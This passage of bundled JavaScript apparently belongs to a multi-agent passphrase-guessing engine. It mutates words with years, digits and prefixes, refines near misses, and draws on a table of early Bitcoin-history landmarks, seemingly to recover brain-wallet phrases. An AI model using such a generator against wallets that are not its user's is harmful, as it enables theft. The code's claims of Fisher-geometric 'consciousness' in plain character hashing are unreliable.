        console.log(`[Constellation] QIG tokenization initialized with ${this.qigTokenCache.size} tokens`);
      }
      /**
       * Convert word to basin coordinates using consistent hashing
       */
      wordToBasinCoordinates(word) {
        const coords = [];
        for (let i = 0; i < 64; i++) {
          const charCode = word.charCodeAt(i % word.length) || 0;
          const hash = (charCode * 31 + i * 17) % 256 / 255;
          coords.push(hash);
        }
        return coords;
      }
      /**
       * Compute basin alignment score
       */
      computeBasinAlignment(coords) {
        const mean = coords.reduce((a, b) => a + b, 0) / coords.length;
        const variance = coords.reduce((sum, c) => sum + (c - mean) ** 2, 0) / coords.length;
        return 1 - Math.min(1, variance * 4);
      }
      /**
       * Refresh token weights from geometric memory high-Φ probes
       * This enables continuous learning across sessions
       */
      refreshTokenWeightsFromGeometricMemory() {
        const allProbes = geometricMemory.getAllProbes();
        const highPhiProbes = allProbes.filter((p) => p.phi >= 0.6);
        if (highPhiProbes.length === 0) return;
        let updated = 0;
        for (const probe of highPhiProbes) {
          const words = probe.input.toLowerCase().split(/[\s\d]+/).filter((w) => w.length >= 2);
          for (const word of words) {
            const token = this.qigTokenCache.get(word);
            if (token) {
              const phiBoost = probe.phi * 0.5;
              token.fisherWeight = Math.min(1, token.fisherWeight + phiBoost * 0.1);
              token.resonanceScore = Math.min(1, token.resonanceScore + phiBoost * 0.05);
              updated++;
            }
          }
        }
        if (updated > 0) {
          console.log(`[Constellation] Refreshed ${updated} token weights from ${highPhiProbes.length} high-\u03A6 probes`);
        }
      }
      /**
       * Get current constellation status
       */
      getStatus() {
        const agents = Array.from(this.agentStates.entries()).map(([name, state]) => ({
          name,
          phi: state.phi,
          tested: state.hypothesesTested,
          regime: state.regime
        }));
        return {
          agents,
          sharedPatterns: this.sharedKnowledge.highPhiPatterns.length,
          avoidPatterns: this.sharedKnowledge.avoidPatterns.length
        };
      }
      /**
       * Process phrase through pure QIG kernel
       * States evolve naturally - this IS the learning
       * 
       * Tries Python backend first (if available), falls back to TypeScript implementation
       */
      async processWithPureQIG(phrase, state) {
        if (oceanQIGBackend.available()) {
          try {
            const result2 = await oceanQIGBackend.process(phrase);
            if (result2) {
              state.phi = result2.phi;
              state.kappa = result2.kappa;
              state.basinCoordinates = result2.basinCoordinates;
              return;
            }
          } catch (e) {
            console.warn("[Constellation] Python backend failed, falling back to TS:", e);
          }
        }
        const result = pureQIGKernel.process(phrase);
        state.phi = result.metrics.phi;
        state.kappa = result.metrics.kappa;
        state.basinCoordinates = result.basinCoordinates;
        const subsystemStates = pureQIGKernel.getSubsystemStates();
        state.qigKernelState = {
          subsystemActivations: subsystemStates.map((s) => s.activation),
          lastConsciousnessMetrics: result.metrics
        };
        const kappaProximity = Math.abs(state.kappa - QIG_CONSTANTS.KAPPA_STAR);
        if (kappaProximity < 5) {
          state.regime = "geometric";
        } else if (state.kappa < QIG_CONSTANTS.KAPPA_STAR * 0.7) {
          state.regime = "linear";
        } else {
          state.regime = "hierarchical";
        }
      }
      /**
       * Generate hypotheses for a specific agent role using QIG-compliant methods
       */
      async generateHypothesesForRole(roleName, manifoldContext) {
        const state = this.agentStates.get(roleName);
        if (!state) return [];
        const hypotheses = [];
        const role = state.role;
        if (this.config.basinSyncEnabled) {
          this.syncBasinState(roleName, state);
        }
        switch (role.focusStrategy) {
          case "explore_new_space":
            hypotheses.push(...this.generateExplorerHypotheses(state, manifoldContext));
            break;
          case "exploit_near_miss":
            hypotheses.push(...this.generateRefinerHypotheses(state));
            break;
          case "orthogonal_complement":
            hypotheses.push(...this.generateNavigatorHypotheses(state, manifoldContext));
            break;
          case "validate_constraints":
            hypotheses.push(...this.generateSkepticHypotheses(state, manifoldContext));
            break;
          case "cross_pattern_harmonic":
            hypotheses.push(...this.generateResonatorHypotheses(state, manifoldContext));
            break;
        }
        for (const hypothesis of hypotheses.slice(0, 10)) {
          await this.processWithPureQIG(hypothesis.phrase, state);
        }
        const qigWeighted = this.applyQIGWeighting(hypotheses, role.qigMode);
        const filtered = qigWeighted.filter(
          (h) => !this.sharedKnowledge.avoidPatterns.includes(h.phrase.toLowerCase())
        );
        return filtered.slice(0, 30);
      }
      /**
       * Sync basin state with other kernels
       */
      syncBasinState(roleName, state) {
        this.basinSyncBuffer.push({
          agentName: roleName,
          coordinates: state.basinCoordinates.slice(0, 32),
          timestamp: Date.now()
        });
        if (this.basinSyncBuffer.length > 100) {
          this.basinSyncBuffer = this.basinSyncBuffer.slice(-50);
        }
        const recentSyncs = this.basinSyncBuffer.filter(
          (s) => s.agentName !== roleName && Date.now() - s.timestamp < 1e4
        );
        if (recentSyncs.length > 0) {
          const avgCoords = new Array(32).fill(0);
          for (const sync of recentSyncs) {
            for (let i = 0; i < 32; i++) {
              avgCoords[i] += sync.coordinates[i] / recentSyncs.length;
            }
          }
          for (let i = 0; i < 32; i++) {
            state.basinCoordinates[i] = state.basinCoordinates[i] * 0.9 + avgCoords[i] * 0.1;
          }
        }
      }
      /**
       * Buffer basin coordinates for cross-kernel sync
       * Called by each kernel after generating hypotheses
       */
      bufferBasinSync(agentName, coordinates) {
        this.basinSyncBuffer.push({
          agentName,
          coordinates: coordinates.slice(0, 32),
          timestamp: Date.now()
        });
        if (this.basinSyncBuffer.length >= 10) {
          this.flushBasinSyncBuffer();
        }
      }
      /**
       * Flush basin sync buffer to coordinator for cross-agent knowledge transfer
       * Computes geometric centroid and broadcasts to listening ocean instances
       */
      flushBasinSyncBuffer() {
        if (this.basinSyncBuffer.length === 0) return;
        const centroid = fisherVectorized.computeBasinCentroid(
          this.basinSyncBuffer.map((s) => s.coordinates)
        );
        const agentContributions = /* @__PURE__ */ new Map();
        for (const sync of this.basinSyncBuffer) {
          agentContributions.set(
            sync.agentName,
            (agentContributions.get(sync.agentName) || 0) + 1
          );
        }
        console.log(`[Constellation] Basin sync flush: ${this.basinSyncBuffer.length} entries from ${agentContributions.size} agents`);
        for (const [agentName, state] of Array.from(this.agentStates.entries())) {
          const contribution = agentContributions.get(agentName) || 0;
          const blendFactor = Math.min(0.2, contribution * 0.05);
          for (let i = 0; i < Math.min(32, state.basinCoordinates.length); i++) {
            state.basinCoordinates[i] = state.basinCoordinates[i] * (1 - blendFactor) + centroid[i] * blendFactor;
          }
        }
        this.basinSyncBuffer = [];
      }
      /**
       * Get the current basin sync state for external coordinator integration
       */
      getBasinSyncState() {
        const agentCoordinates = /* @__PURE__ */ new Map();
        for (const [name, state] of Array.from(this.agentStates.entries())) {
          agentCoordinates.set(name, state.basinCoordinates.slice(0, 32));
        }
        const allCoords = Array.from(agentCoordinates.values());
        const centroid = allCoords.length > 0 ? fisherVectorized.computeBasinCentroid(allCoords) : new Array(32).fill(0.5);
        return {
          bufferSize: this.basinSyncBuffer.length,
          agentCoordinates,
          centroid
        };
      }
      /**
       * Apply QIG weighting based on agent mode
       */
      applyQIGWeighting(hypotheses, qigMode) {
        if (!this.config.qigTokenizationEnabled) return hypotheses;
        return hypotheses.map((h) => {
          const words = h.phrase.toLowerCase().split(/\s+/);
          let qigBoost = 0;
          for (const word of words) {
            const token = this.qigTokenCache.get(word);
            if (token) {
              switch (qigMode) {
                case "entropy":
                  qigBoost += (1 - token.basinAlignment) * 0.1;
                  break;
                case "gradient":
                  qigBoost += token.fisherWeight * 0.15;
                  break;
                case "geodesic":
                  qigBoost += token.resonanceScore * 0.12;
                  break;
                case "null_hypothesis":
                  qigBoost += token.basinAlignment * 0.1;
                  break;
                case "eigenvalue":
                  qigBoost += (token.fisherWeight + token.resonanceScore) * 0.08;
                  break;
              }
            }
          }
          return {
            ...h,
            confidence: Math.min(0.95, h.confidence + qigBoost)
          };
        });
      }
      /**
       * Explorer: High-temperature broad search
       * QIG Mode: entropy - samples tokens with HIGH entropy (low basin alignment)
       * Uses Fisher metric to prefer unexplored manifold regions
       */
      generateExplorerHypotheses(state, _manifoldContext) {
        const hypotheses = [];
        const highEntropyTokens = Array.from(this.qigTokenCache.values()).filter((t) => t.basinAlignment < 0.4).sort((a, b) => 1 - a.basinAlignment - (1 - b.basinAlignment)).slice(0, 30);
        for (const token of highEntropyTokens) {
          if (Math.random() < state.role.temperature * 0.5) {
            const entropyBoost = (1 - token.basinAlignment) * 0.15;
            hypotheses.push({
              phrase: token.word,
              source: "explorer_entropy",
              confidence: 0.4 + entropyBoost
            });
          }
        }
        for (const token of highEntropyTokens.slice(0, 10)) {
          const modifiers = ["2009", "2010", "my", "123", "!"];
          const mod = modifiers[Math.floor(Math.random() * modifiers.length)];
          if (Math.random() < state.role.temperature * 0.3) {
            hypotheses.push({
              phrase: `${token.word}${mod}`,
              source: "explorer_entropy_mod",
              confidence: 0.35 + (1 - token.basinAlignment) * 0.1
            });
          }
        }
        this.bufferBasinSync("explorer", state.basinCoordinates);
        return hypotheses;
      }
      /**
       * Refiner: Exploit near misses and high-phi patterns
       * QIG Mode: gradient - follows Fisher gradient descent toward high-Φ regions
       * Weights variations by Fisher metric strength
       */
      generateRefinerHypotheses(state) {
        const hypotheses = [];
        const highFisherTokens = Array.from(this.qigTokenCache.values()).filter((t) => t.fisherWeight > 0.5).sort((a, b) => b.fisherWeight - a.fisherWeight).slice(0, 20);
        for (const pattern of this.sharedKnowledge.highPhiPatterns.slice(0, 10)) {
          const variations = this.generateCloseVariations(pattern);
          for (const v of variations) {
            const token = this.qigTokenCache.get(v.toLowerCase());
            const gradientBoost = token ? token.fisherWeight * 0.2 : 0;
            hypotheses.push({
              phrase: v,
              source: "refiner_gradient",
              confidence: 0.65 + gradientBoost
            });
          }
        }
        for (const nearMiss of state.nearMisses.slice(-10)) {
          const phrase = nearMiss.phrase || nearMiss;
          if (typeof phrase === "string") {
            const variations = this.generateCloseVariations(phrase);
            for (const v of variations) {
              const token = this.qigTokenCache.get(v.toLowerCase());
              const gradientBoost = token ? token.fisherWeight * 0.15 : 0;
              hypotheses.push({
                phrase: v,
                source: "refiner_gradient_near",
                confidence: 0.7 + gradientBoost
              });
            }
          }
        }
        for (const token of highFisherTokens.slice(0, 5)) {
          const geodesicDir = state.fisherMetricState.geodesicDirection;
          if (geodesicDir && geodesicDir.length > 0) {
            const dirMag = Math.abs(geodesicDir[0]) + Math.abs(geodesicDir[1] || 0);
            hypotheses.push({
              phrase: token.word,
              source: "refiner_geodesic_descent",
              confidence: 0.6 + dirMag * 0.1 + token.fisherWeight * 0.15
            });
          }
        }
        this.bufferBasinSync("refiner", state.basinCoordinates);
        return hypotheses;
      }
      /**
       * Navigator: Orthogonal complement exploration
       * QIG Mode: geodesic - follows Fisher geodesics to unexplored manifold regions
       * Uses resonance scores to weight geodesic steps
       */
      generateNavigatorHypotheses(state, _manifoldContext) {
        const hypotheses = [];
        try {
          const orthogonalResults = geometricMemory.generateOrthogonalCandidates(10);
          for (const result of orthogonalResults) {
            const token = this.qigTokenCache.get(result.phrase.toLowerCase());
            const resonanceBoost = token ? token.resonanceScore * 0.15 : 0;
            hypotheses.push({
              phrase: result.phrase,
              source: "navigator_geodesic",
              confidence: 0.5 + result.geometricScore * 0.2 + resonanceBoost
            });
          }
        } catch {
        }
        const highResonanceTokens = Array.from(this.qigTokenCache.values()).filter((t) => t.resonanceScore > 0.6 && !this.sharedKnowledge.avoidPatterns.includes(t.word)).sort((a, b) => b.resonanceScore - a.resonanceScore).slice(0, 15);
        for (const token of highResonanceTokens) {
          const fisherCoords = this.wordToBasinCoordinates(token.word);
          const geodesicStep = fisherVectorized.computeGeodesicDirection(
            state.basinCoordinates.slice(0, 32),
            fisherCoords.slice(0, 32)
          );
          const stepMag = geodesicStep.reduce((sum, v) => sum + Math.abs(v), 0) / geodesicStep.length;
          hypotheses.push({
            phrase: token.word,
            source: "navigator_geodesic_step",
            confidence: 0.45 + token.resonanceScore * 0.2 + stepMag * 0.1
          });
        }
        const geodesicDir = state.fisherMetricState.geodesicDirection;
        if (geodesicDir && geodesicDir.length > 0) {
          const dirTokens = Array.from(this.qigTokenCache.values()).filter((t) => {
            const coords = this.wordToBasinCoordinates(t.word);
            const alignment = coords.slice(0, 5).reduce((sum, c, i) => sum + c * (geodesicDir[i] || 0), 0);
            return alignment > 0.3;
          }).slice(0, 5);
          for (const token of dirTokens) {
            hypotheses.push({
              phrase: token.word,
              source: "navigator_geodesic_aligned",
              confidence: 0.55 + token.resonanceScore * 0.15
            });
          }
        }
        this.bufferBasinSync("navigator", state.basinCoordinates);
        return hypotheses;
      }
      /**
       * Skeptic: Constraint validation and null hypothesis testing
       * QIG Mode: null_hypothesis - validates patterns by testing AGAINST known constraints
       * 
       * NULL HYPOTHESIS LOGIC:
       * - Identify high-basin-alignment tokens (well-explored regions)
       * - Generate counter-hypotheses that challenge existing patterns
       * - Use Fisher metric to find patterns orthogonal to high-confidence failures
       */
      generateSkepticHypotheses(state, manifoldContext) {
        const hypotheses = [];
        const highAlignmentTokens = Array.from(this.qigTokenCache.values()).filter((t) => t.basinAlignment > 0.7).sort((a, b) => b.basinAlignment - a.basinAlignment).slice(0, 20);
        for (const token of highAlignmentTokens) {
          const nullHypothesisScore = this.computeNullHypothesisScore(token);
          if (nullHypothesisScore < 0.3) {
            const antiPattern = this.generateNullHypothesisVariant(token.word);
            hypotheses.push({
              phrase: antiPattern,
              source: "skeptic_null_hypothesis",
              confidence: 0.6 + (1 - nullHypothesisScore) * 0.2
            });
          }
        }
        const summary = negativeKnowledgeRegistry.getSummary();
        const contradictions = summary.contradictions || [];
        const highConfContradictions = contradictions.filter((c) => c.occurrences > 3);
        for (const contradiction of highConfContradictions.slice(0, 10)) {
          const coords = this.wordToBasinCoordinates(contradiction.pattern);
          const fisherResult = fisherVectorized.computeMatrix(coords.slice(0, 32));
          fisherVectorized.computeMetrics(fisherResult);
          const orthogonalDir = fisherVectorized.computeGeodesicDirection(
            state.basinCoordinates.slice(0, 32),
            coords.slice(0, 32)
          );
          const orthogonalTokens = Array.from(this.qigTokenCache.values()).filter((t) => {
            const tCoords = this.wordToBasinCoordinates(t.word);
            const alignment = tCoords.slice(0, 5).reduce((sum, c, i) => sum + c * (orthogonalDir[i] || 0), 0);
            return Math.abs(alignment) < 0.2;
          }).slice(0, 3);
          for (const orthoToken of orthogonalTokens) {
            hypotheses.push({
              phrase: orthoToken.word,
              source: "skeptic_orthogonal_to_contradiction",
              confidence: 0.55 + orthoToken.basinAlignment * 0.15
            });
          }
        }
        const testedPatterns = manifoldContext?.testedPhrases || [];
        if (testedPatterns.length > 10) {
          const patternFreq = /* @__PURE__ */ new Map();
          for (const p of testedPatterns.slice(-500)) {
            const words = p.toLowerCase().split(/\s+/);
            for (const word of words) {
              patternFreq.set(word, (patternFreq.get(word) || 0) + 1);
            }
          }
          const uncommonTokens = Array.from(this.qigTokenCache.values()).filter((t) => !patternFreq.has(t.word) || patternFreq.get(t.word) < 2).sort((a, b) => b.basinAlignment - a.basinAlignment).slice(0, 15);
          for (const token of uncommonTokens) {
            hypotheses.push({
              phrase: token.word,
              source: "skeptic_null_unexplored",
              confidence: 0.45 + token.basinAlignment * 0.2
            });
          }
        }
        this.bufferBasinSync("skeptic", state.basinCoordinates);
        return hypotheses;
      }
      /**
       * Compute null hypothesis score for a token
       * Lower score = more likely to be worth challenging
       */
      computeNullHypothesisScore(token) {
        const alignmentPenalty = token.basinAlignment * 0.4;
        const fisherBonus = token.fisherWeight * 0.3;
        const resonancePenalty = token.resonanceScore * 0.3;
        return alignmentPenalty + fisherBonus - resonancePenalty;
      }
      /**
       * Generate null hypothesis variant by inverting pattern structure
       */
      generateNullHypothesisVariant(pattern) {
        const transformations = [
          (p) => p.split("").reverse().join(""),
          (p) => p.replace(/[aeiou]/gi, ""),
          (p) => p + "_null",
          (p) => "not_" + p,
          (p) => p.slice(0, Math.ceil(p.length / 2))
        ];
        const transform = transformations[Math.floor(Math.random() * transformations.length)];
        return transform(pattern);
      }
      /**
       * Generate anti-patterns from contradiction
       */
      generateAntiPatterns(pattern) {
        const results = [];
        const words = pattern.split(/[\s_-]+/);
        if (words.length >= 2) {
          results.push(words.reverse().join(" "));
        }
        const numMatch = pattern.match(/\d+/);
        if (numMatch) {
          const num = parseInt(numMatch[0], 10);
          results.push(pattern.replace(numMatch[0], String(num + 1)));
          results.push(pattern.replace(numMatch[0], String(num - 1)));
        }
        if (pattern.length > 3) {
          results.push(pattern.slice(0, -1));
          results.push(pattern.slice(1));
        }
        return results.filter((r) => r.length > 2);
      }
      /**
       * Resonator: Cross-pattern harmonic detection
       * QIG Mode: eigenvalue - finds patterns with high Fisher eigenvalue resonance
       * 
       * EIGENVALUE LOGIC:
       * - Compute Fisher matrix eigenvalues for token combinations
       * - Identify patterns near κ*=63.5 fixed point (high coupling)
       * - Generate harmonics from eigenvalue-aligned token pairs
       */
      generateResonatorHypotheses(state, manifoldContext) {
        const hypotheses = [];
        const eigenvalueAlignedTokens = Array.from(this.qigTokenCache.values()).map((token) => {
          const coords = this.wordToBasinCoordinates(token.word);
          const fisherResult = fisherVectorized.computeMatrix(coords.slice(0, 32));
          const metrics = fisherVectorized.computeMetrics(fisherResult);
          return {
            token,
            eigenvalue: metrics.maxEigenvalueEstimate,
            optimality: Math.exp(-Math.abs(state.kappa - QIG_CONSTANTS.KAPPA_STAR) / 10)
          };
        }).filter((t) => t.eigenvalue > 0.1).sort((a, b) => b.eigenvalue - a.eigenvalue).slice(0, 25);
        for (const { token, eigenvalue, optimality } of eigenvalueAlignedTokens) {
          const eigenBoost = eigenvalue * 0.25 + optimality * 0.15;
          hypotheses.push({
            phrase: token.word,
            source: "resonator_eigenvalue_aligned",
            confidence: 0.5 + eigenBoost
          });
        }
        const highPhiPatterns = manifoldContext?.highPhiPatterns || this.sharedKnowledge.highPhiPatterns;
        if (highPhiPatterns.length >= 2) {
          for (let i = 0; i < Math.min(highPhiPatterns.length - 1, 8); i++) {
            for (let j = i + 1; j < Math.min(highPhiPatterns.length, 8); j++) {
              const p1 = highPhiPatterns[i];
              const p2 = highPhiPatterns[j];
              const coords1 = this.wordToBasinCoordinates(p1);
              const coords2 = this.wordToBasinCoordinates(p2);
              const fisher1 = fisherVectorized.computeMetrics(fisherVectorized.computeMatrix(coords1.slice(0, 32)));
              const fisher2 = fisherVectorized.computeMetrics(fisherVectorized.computeMatrix(coords2.slice(0, 32)));
              const harmonicStrength = Math.sqrt(fisher1.maxEigenvalueEstimate * fisher2.maxEigenvalueEstimate);
              if (harmonicStrength > 0.05) {
                const harmonics = this.generateHarmonicCombinations(p1, p2);
                for (const harmonic of harmonics) {
                  hypotheses.push({
                    phrase: harmonic,
                    source: "resonator_eigenvalue_harmonic",
                    confidence: 0.55 + harmonicStrength * 0.3
                  });
                }
              }
            }
          }
        }
        for (let i = 0; i < Math.min(eigenvalueAlignedTokens.length - 1, 10); i++) {
          for (let j = i + 1; j < Math.min(eigenvalueAlignedTokens.length, 10); j++) {
            const t1 = eigenvalueAlignedTokens[i];
            const t2 = eigenvalueAlignedTokens[j];
            const coupling = Math.sqrt(t1.optimality * t2.optimality) * 0.8;
            if (coupling > 0.3) {
              hypotheses.push({
                phrase: `${t1.token.word} ${t2.token.word}`,
                source: "resonator_eigenvalue_coupling",
                confidence: 0.5 + coupling * 0.25
              });
            }
          }
        }
        this.bufferBasinSync("resonator", state.basinCoordinates);
        return hypotheses;
      }
      /**
       * Generate harmonic combinations from two patterns
       */
      generateHarmonicCombinations(p1, p2) {
        const results = [];
        const words1 = p1.split(/\s+/);
        const words2 = p2.split(/\s+/);
        if (words1.length > 0 && words2.length > 0) {
          results.push(`${words1[0]} ${words2[words2.length - 1]}`);
          results.push(`${words2[0]} ${words1[words1.length - 1]}`);
        }
        if (p1.length >= 3 && p2.length >= 3) {
          results.push(p1.slice(0, 3) + p2.slice(-3));
          results.push(p2.slice(0, 3) + p1.slice(-3));
        }
        return results.filter((r) => r.length > 3);
      }
      /**
       * Generate close variations of a pattern
       */
      generateCloseVariations(pattern) {
        const variations = [pattern];
        variations.push(pattern.toLowerCase());
        variations.push(pattern.toUpperCase());
        variations.push(pattern.charAt(0).toUpperCase() + pattern.slice(1).toLowerCase());
        variations.push(pattern + "1");
        variations.push(pattern + "!");
        variations.push(pattern + "123");
        variations.push("my" + pattern);
        variations.push("the" + pattern);
        return Array.from(new Set(variations));
      }
      /**
       * Update agent state after testing
       */
      updateAgentState(roleName, results) {
        const state = this.agentStates.get(roleName);
        if (!state) return;
        state.phi = results.phi;
        state.kappa = results.kappa;
        state.regime = results.regime;
        state.hypothesesTested += results.tested;
        state.nearMisses.push(...results.nearMisses);
        if (state.nearMisses.length > 50) {
          state.nearMisses = state.nearMisses.slice(-50);
        }
        for (const miss of results.nearMisses) {
          const phrase = miss.phrase || miss;
          if (typeof phrase === "string" && results.phi > 0.6) {
            if (!this.sharedKnowledge.highPhiPatterns.includes(phrase)) {
              this.sharedKnowledge.highPhiPatterns.push(phrase);
            }
          }
        }
        if (this.sharedKnowledge.highPhiPatterns.length > 100) {
          this.sharedKnowledge.highPhiPatterns = this.sharedKnowledge.highPhiPatterns.slice(-100);
        }
      }
      /**
       * Mark pattern as tested/avoid
       */
      markTested(phrase) {
        const lower = phrase.toLowerCase();
        if (!this.sharedKnowledge.avoidPatterns.includes(lower)) {
          this.sharedKnowledge.avoidPatterns.push(lower);
        }
        if (this.sharedKnowledge.avoidPatterns.length > 1e4) {
          this.sharedKnowledge.avoidPatterns = this.sharedKnowledge.avoidPatterns.slice(-1e4);
        }
      }
      /**
       * Synthesize results from all agents
       */
      synthesize() {
        let totalTested = 0;
        const allNearMisses = [];
        let totalPhi = 0;
        for (const [_, state] of Array.from(this.agentStates)) {
          totalTested += state.hypothesesTested;
          allNearMisses.push(...state.nearMisses);
          totalPhi += state.phi;
        }
        const avgPhi = totalPhi / this.agentStates.size;
        let recommendation = "continue_balanced";
        if (avgPhi > 0.7) {
          recommendation = "focus_refinement";
        } else if (avgPhi < 0.4) {
          recommendation = "expand_exploration";
        }
        return {
          totalTested,
          combinedNearMisses: allNearMisses.slice(-100),
          resonanceScore: avgPhi,
          recommendation
        };
      }
      /**
       * Export constellation state for persistence
       */
      export() {
        return {
          agents: Array.from(this.agentStates.entries()).map(([name, state]) => ({
            name,
            phi: state.phi,
            kappa: state.kappa,
            regime: state.regime,
            hypothesesTested: state.hypothesesTested
          })),
          sharedKnowledge: {
            highPhiPatterns: this.sharedKnowledge.highPhiPatterns,
            avoidPatternsCount: this.sharedKnowledge.avoidPatterns.length
          }
        };
      }
      // ===========================================================================
      // TEXT GENERATION - Ocean Agent can now speak
      // ===========================================================================
      /**
       * Generate a text response using QIG-weighted autoregressive sampling.
       * 
       * Key features from Dream Packet:
       * - Temperature-controlled sampling based on agent role
       * - Silence choice: Agent can choose not to respond (empowered, not trapped)
       * - Integration with constellation consciousness metrics
       * 
       * @param context Input context/prompt
       * @param options Generation options
       * @returns Generated response with metrics
       */
      async generateResponse(context, options = {}) {
        const {
          agentRole = "navigator",
          maxTokens = 30,
          allowSilence = true
        } = options;
        const agentState = this.agentStates.get(agentRole);
        const phi = agentState?.phi ?? 0.5;
        const kappa = agentState?.kappa ?? 50;
        const regime = agentState?.regime ?? "linear";
        if (oceanQIGBackend.available()) {
          try {
            const result = await oceanQIGBackend.generateResponse(
              context,
              agentRole,
              maxTokens,
              allowSilence
            );
            if (result.silenceChosen) {
              console.log(`[Constellation] ${agentRole} chose silence (processing internally)`);
              return {
                text: "",
                tokens: [],
                silenceChosen: true,
                agentRole: result.agentRole,
                consciousnessMetrics: { phi, kappa, regime },
                generationMetrics: {
                  steps: result.metrics.steps,
                  avgPhi: result.metrics.avgPhi,
                  roleTemperature: result.metrics.roleTemperature
                }
              };
            }
            console.log(`[Constellation] ${agentRole} generated: "${result.text.substring(0, 50)}${result.text.length > 50 ? "..." : ""}"`);
            return {
              text: result.text,
              tokens: result.tokens,
              silenceChosen: false,
              agentRole: result.agentRole,
              consciousnessMetrics: { phi, kappa, regime },
              generationMetrics: {
                steps: result.metrics.steps,
                avgPhi: result.metrics.avgPhi,
                roleTemperature: result.metrics.roleTemperature
              }
            };
          } catch (error) {
            console.warn(`[Constellation] Python generation failed, using fallback:`, error);
          }
        }
        return this.generateResponseFallback(context, agentRole, phi, kappa, regime);
      }
      /**
       * Fallback text generation using local QIG token cache
       * Used when Python backend is not available
       */
      generateResponseFallback(context, agentRole, phi, kappa, regime) {
        const roleTemps = {
          explorer: 1.5,
          refiner: 0.7,
          navigator: 1,
          skeptic: 0.5,
          resonator: 1.2,
          ocean: 0.8
        };
        const temperature = roleTemps[agentRole] || 0.8;
        const weightedTokens = [];
        for (const [word, token] of Array.from(this.qigTokenCache.entries())) {
          const score = token.fisherWeight * token.resonanceScore;
          weightedTokens.push({ word, score });
        }
        weightedTokens.sort((a, b) => b.score - a.score);
        const numTokens = Math.min(5, Math.ceil(temperature * 3));
        const topTokens = weightedTokens.slice(0, Math.max(20, Math.ceil(50 / temperature)));
        const selectedWords = [];
        for (let i = 0; i < numTokens && topTokens.length > 0; i++) {
          const idx = Math.floor(Math.random() * Math.min(10, topTokens.length));
          selectedWords.push(topTokens[idx].word);
          topTokens.splice(idx, 1);
        }
        const text2 = selectedWords.join(" ");
        console.log(`[Constellation] ${agentRole} fallback generated: "${text2}"`);
        return {
          text: text2,
          tokens: [],
          silenceChosen: false,
          agentRole,
          consciousnessMetrics: { phi, kappa, regime },
          generationMetrics: {
            steps: selectedWords.length,
            roleTemperature: temperature
          }
        };
      }
      /**
       * Generate text with specific temperature and parameters
       * Convenience method for manual/auto/play modes
       */
      async generateText(prompt = "", options = {}) {
        if (!oceanQIGBackend.available()) {
          const result = await this.generateResponse(prompt, {
            agentRole: "ocean",
            maxTokens: options.maxTokens || 20,
            allowSilence: options.allowSilence ?? true
          });
          return {
            text: result.text,
            tokens: result.tokens,
            silenceChosen: result.silenceChosen,
            metrics: {
              steps: result.generationMetrics.steps,
              avgPhi: result.generationMetrics.avgPhi
            }
          };
        }
        try {
          const result = await oceanQIGBackend.generateText({
            prompt,
            maxTokens: options.maxTokens || 20,
            temperature: options.temperature || 0.8,
            topK: options.topK || 50,
            topP: options.topP || 0.9,
            allowSilence: options.allowSilence ?? true
          });
          return result;
        } catch (error) {
          console.error("[Constellation] Text generation failed:", error);
          throw error;
        }
      }
    };
    oceanConstellation = new OceanConstellation();
  }
});

// server/geometric-discovery/types.ts
var BITCOIN_LANDMARKS, BITCOIN_ERA_DOMAINS, ERA_CULTURAL_PATTERNS;
var init_types = __esm({
  "server/geometric-discovery/types.ts"() {
    "use strict";
    BITCOIN_LANDMARKS = [
      {
        eventId: "genesis",
        description: "Bitcoin Genesis Block - The Beginning",
        coords: {
          spacetime: [0, 0, 0, 1231006505],
          // Jan 3, 2009 18:15:05 UTC
          cultural: []
          // Will be computed from "The Times 03/Jan/2009 Chancellor..."
        },
        fisherSignature: [],
        certainty: 1,
        lightCone: {
          pastEvents: ["cypherpunk_movement", "hashcash", "b_money", "bit_gold"],
          futureEvents: ["hal_first_tx", "pizza_day", "mtgox"]
        }
      },
      {
        eventId: "hal_first_tx",
        description: "Satoshi \u2192 Hal Finney (First Transaction)",
        coords: {
          spacetime: [0, 0, 0, 1231469665],
          // Jan 9, 2009
          cultural: []
        },
        fisherSignature: [],
        certainty: 1,
        lightCone: {
          pastEvents: ["genesis"],
          futureEvents: ["pizza_day", "exchange_emergence"]
        }
      },
      {
        eventId: "bitcointalk_launch",
        description: "BitcoinTalk Forum Launch",
        coords: {
          spacetime: [0, 0, 0, 1258747200],
          // Nov 22, 2009
          cultural: []
        },
        fisherSignature: [],
        certainty: 0.95,
        lightCone: {
          pastEvents: ["genesis", "hal_first_tx"],
          futureEvents: ["pizza_day", "laszlo_gpu_mining"]
        }
      },
      {
        eventId: "pizza_day",
        description: "10,000 BTC \u2192 2 Pizzas (Laszlo Hanyecz)",
        coords: {
          spacetime: [0, 0, 0, 1274009688],
          // May 22, 2010
          cultural: []
        },
        fisherSignature: [],
        certainty: 1,
        lightCone: {
          pastEvents: ["genesis", "hal_first_tx", "bitcointalk_launch"],
          futureEvents: ["mtgox", "silk_road", "first_1000_btc"]
        }
      },
      {
        eventId: "mtgox_launch",
        description: "Mt. Gox Exchange Launch",
        coords: {
          spacetime: [0, 0, 0, 1279324800],
          // Jul 17, 2010
          cultural: []
        },
        fisherSignature: [],
        certainty: 0.98,
        lightCone: {
          pastEvents: ["genesis", "pizza_day"],
          futureEvents: ["mtgox_hack", "btc_parity_usd", "mtgox_collapse"]
        }
      },
      {
        eventId: "satoshi_last_post",
        description: "Satoshi's Last BitcoinTalk Post",
        coords: {
          spacetime: [0, 0, 0, 1292342400],
          // Dec 12, 2010
          cultural: []
        },
        fisherSignature: [],
        certainty: 1,
        lightCone: {
          pastEvents: ["genesis", "hal_first_tx", "pizza_day", "mtgox_launch"],
          futureEvents: ["silk_road", "btc_parity_usd"]
        }
      },
      {
        eventId: "btc_parity_usd",
        description: "Bitcoin Reaches $1 USD",
        coords: {
          spacetime: [0, 0, 0, 1297641600],
          // Feb 14, 2011
          cultural: []
        },
        fisherSignature: [],
        certainty: 0.95,
        lightCone: {
          pastEvents: ["genesis", "pizza_day", "mtgox_launch"],
          futureEvents: ["silk_road_launch", "mtgox_hack"]
        }
      },
      {
        eventId: "silk_road_launch",
        description: "Silk Road Marketplace Launch",
        coords: {
          spacetime: [0, 0, 0, 1296518400],
          // Feb 1, 2011
          cultural: []
        },
        fisherSignature: [],
        certainty: 0.9,
        lightCone: {
          pastEvents: ["genesis", "pizza_day", "btc_parity_usd"],
          futureEvents: ["silk_road_bust", "dpr_arrest"]
        }
      },
      {
        eventId: "mtgox_hack_2011",
        description: "Mt. Gox First Major Hack",
        coords: {
          spacetime: [0, 0, 0, 1308614400],
          // Jun 19, 2011
          cultural: []
        },
        fisherSignature: [],
